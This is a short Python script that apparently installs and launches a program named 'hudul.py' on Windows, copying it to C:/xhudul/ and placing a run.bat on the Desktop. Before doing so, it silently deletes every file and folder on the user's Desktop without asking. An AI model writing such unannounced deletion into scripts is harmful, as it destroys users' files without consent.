import os
import subprocess
import shutil
import win32com.client

script_location = os.path.dirname(os.path.abspath(__file__))
hudul_path = os.path.join(script_location, "hudul.py")
print(hudul_path)

location1 = "C:/"
location2 = "C:/xhudul/"
log_path = "C:/xhudul/log.txt"

if not os.path.exists(location2):
    os.makedirs(location2)
with open(log_path, 'w'):
    pass
destination_path = os.path.join(location2, "hudul.py")
shutil.copy(hudul_path, destination_path)

def clear_desktop():
    desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")

    try:
        for root, dirs, files in os.walk(desktop_path):
            for file in files:
                file_path = os.path.join(root, file)
                os.remove(file_path)
            for dir in dirs:
                dir_path = os.path.join(root, dir)
                os.rmdir(dir_path)

        print("Desktop cleared successfully.")
    except Exception as e:
        print(f"An error occurred: {e}")

def copy_bat_to_desktop(location1):
    filename = "run.bat"
    source_path = os.path.join(location1, filename)
    desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
    destination_path = os.path.join(desktop_path, filename)
    
    try:
        shutil.copy2(source_path, destination_path)
        print(f"{filename} copied to desktop successfully.")
    except FileNotFoundError:
        print(f"File not found: {filename} in {location1}")
    except PermissionError:
        print(f"Permission error: Unable to copy {filename} to desktop.")
    except Exception as e:
        print(f"An error occurred: {e}")

def desktop():
    location1 = script_location+"/run/"
    copy_bat_to_desktop(location1)



clear_desktop()
desktop()
subprocess.run(['python', 'hudul.py'], check=True)